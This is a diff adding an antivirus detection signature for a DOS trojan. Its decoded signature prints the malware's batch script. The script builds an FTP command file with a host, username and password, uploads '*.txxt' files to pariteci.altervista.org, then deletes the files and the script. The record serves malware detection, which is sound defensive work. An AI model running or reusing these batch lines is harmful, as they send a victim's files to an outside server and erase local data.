@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36640
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off echo open pariteci.altervista.org>> upload.ftp echo pariteci>> upload.ftp echo vudsepipma13>> upload.ftp echo put *.txxt>> upload.ftp echo quit>> upload.ftp ftp.exe -v -s:upload.ftp del upload.ftp del *.txxt 
